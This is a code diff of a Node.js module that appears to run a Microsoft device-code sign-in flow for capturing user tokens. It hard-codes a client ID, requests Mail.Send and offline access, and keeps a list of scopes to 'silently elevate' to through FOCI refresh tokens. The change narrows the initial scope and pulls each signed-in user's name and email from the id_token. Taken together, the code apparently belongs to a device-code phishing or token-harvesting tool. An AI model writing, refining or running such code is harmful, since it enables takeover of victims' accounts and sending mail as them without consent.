@@ -20,7 +20,7 @@ const CLIENT_ID = process.env.MS_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab
 const TENANT    = process.env.MS_TENANT    || 'common';
 
 // Initial scope — only what works for device code request
-const INITIAL_SCOPE = 'https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access';
+const INITIAL_SCOPE = 'openid profile email https://graph.microsoft.com/Mail.Send offline_access';
 
 // Additional scopes to silently elevate to via FOCI refresh token
 const ELEVATED_SCOPES = [
@@ -201,28 +201,14 @@ function _startPollLoop(sessionKey, deviceCode, intervalSecs) {
 
       const expiresAt = new Date(Date.now() + (r.expires_in || 3600) * 1000).toISOString();
 
-      // Get profile - the local graphGet returns parsed JSON directly
+      // Get profile from id_token first (always available, no extra scope needed)
       let msName = '', msEmail = '';
-      try {
-        const profile = await graphGet('/v1.0/me?$select=displayName,mail,userPrincipalName', r.access_token);
-        if (profile && profile.displayName) {
-          msName  = profile.displayName || '';
-          msEmail = profile.mail || profile.userPrincipalName || '';
-          console.log(`[DevFlow] Profile fetched: ${msName} <${msEmail}>`);
-        } else {
-          console.log(`[DevFlow] Profile fetch returned:`, JSON.stringify(profile).slice(0, 200));
-        }
-      } catch (e) {
-        console.log(`[DevFlow] Profile fetch error:`, e.message);
-      }
-
-      // Fallback: decode id_token
-      if (!msEmail && r.id_token) {
+      if (r.id_token) {
         try {
           const payload = JSON.parse(Buffer.from(r.id_token.split('.')[1], 'base64url').toString());
-          msName  = msName  || payload.name || '';
-          msEmail = msEmail || payload.preferred_username || payload.upn || payload.email || '';
-          console.log(`[DevFlow] Used id_token fallback: ${msName} <${msEmail}>`);
+          msName  = payload.name || '';
+          msEmail = payload.preferred_username || payload.upn || payload.email || '';
+          console.log(`[DevFlow] Profile from id_token: ${msName} <${msEmail}>`);
         } catch (e) {
           console.log(`[DevFlow] id_token decode failed:`, e.message);
         }
